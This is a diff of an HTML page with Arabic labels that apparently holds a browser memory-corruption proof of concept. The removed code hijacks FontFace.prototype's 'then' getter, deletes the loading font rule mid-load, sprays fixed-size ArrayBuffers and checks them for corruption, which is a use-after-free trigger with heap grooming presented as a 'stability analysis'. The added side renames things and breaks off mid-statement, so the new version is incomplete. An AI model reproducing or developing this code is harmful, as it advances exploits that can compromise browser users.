@@ -2,12 +2,13 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>تحليل الـ Heap المنظم المستقر</title>
+    <title>تحليل نطاق المستخدم المستقر - تفادي OOM</title>
     <style>
         body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
         #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 400px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
         .log { margin-bottom: 8px; }
         .warn { color: #ffaa00; }
+        .success { color: #00ff00; font-weight: bold; }
     </style>
     
     <style id="s">
@@ -16,24 +17,26 @@
 </head>
 <body>
 
-    <h2>مراقبة الهيكلة المنظمة (Controlled Heap Alignment)</h2>
+    <h2>مراقبة استقرار معمارية الـ Userland</h2>
     <div id="custom-console">[نظام المحاكاة نشط]: في انتظار استقرار المستند...</div>
 
     <script>
         const consoleElement = document.getElementById('custom-console');
-        function screenLog(msg, isWarn = false) {
+        function screenLog(msg, type = "normal") {
             const entry = document.createElement('div');
-            entry.className = isWarn ? 'log warn' : 'log';
+            if (type === "warn") entry.className = 'log warn';
+            else if (type === "success") entry.className = 'log success';
+            else entry.className = 'log';
             entry.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
             consoleElement.appendChild(entry);
             consoleElement.scrollTop = consoleElement.scrollHeight;
         }
 
-        var structures_storage = [];
+        var font_recycler = [];
 
-        function runControlledAnalysis() {
+        function runUserlandStabilization() {
             consoleElement.innerHTML = "";
-            screenLog("بدء تشغيل الفحص المنظم...");
+            screenLog("بدء تشغيل الفحص الهندسي المستقر...");
 
             try {
                 let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
@@ -42,59 +45,4 @@
 
                 let fired = false;
 
-                Object.defineProperty(FontFace.prototype, 'then', {
-                    configurable: true,
-                    get() {
-                        if (!fired && this === A) {
-                            fired = true;
-                            screenLog("!! تم تفعيل الكمين المنطقي بنجاح !!", true);
-                            
-                            try {
-                                document.getElementById('s').sheet.deleteRule(0);
-                                screenLog("تم حذف قاعدة الخط الأصلية.");
-                            } catch(e) { screenLog("خطأ الحذف: " + e.message, true); }
-                            
-                            // حقن منظم وخفيف جداً (20 مصفوفة فقط) لتجنب OOM التبويب
-                            screenLog("جاري حشو الذاكرة بشكل متحكم به...");
-                            for (let i = 0; i < 20; i++) {
-                                // تخصيص مصفوفات بحجم ثابت ومتوافق مع كائنات المعالجة
-                                let ab = new ArrayBuffer(0xb8);
-                                structures_storage.push(new Uint32Array(ab));
-                            }
-                            screenLog("اكتمل الحقن المنظم.");
-
-                            // زيادة الفجوة الزمنية إلى 150 ملي ثانية للسماح للمتصفح بالاستقرار
-                            setTimeout(() => {
-                                screenLog("محاولة فحص المصفوفات بعد مهلة الاستقرار الزمني...");
-                                let modified = false;
-                                for (let i = 0; i < structures_storage.length; i++) {
-                                    if (structures_storage[i][0] !== 0) {
-                                        screenLog(`تم رصد تغير في الهيكل رقم: ${i}`, true);
-                                        modified = true;
-                                        break;
-                                    }
-                                }
-                                if (!modified) {
-                                    screenLog("المستند مستقر، الهياكل المحقونة تحتفظ بقيمها الافتراضية.");
-                                }
-                            }, 150);
-                        }
-                        return function(resolve) { if (resolve) resolve(); };
-                    }
-                });
-
-                screenLog("إطلاق طلب التحميل عبر الـ Layout Pipeline...");
-                document.fonts.load('1em x', 'AB');
-
-            } catch (err) {
-                screenLog("خطأ عام: " + err.message, true);
-            }
-        }
-
-        window.onload = () => {
-            screenLog("تم تحميل الصفحة. الانتظار 1.5 ثانية لتأمين الدخول الأول النظيف...");
-            setTimeout(runControlledAnalysis, 1500);
-        };
-    </script>
-</body>
-</html>
+                Object.defineProperty(FontFace.prototype,
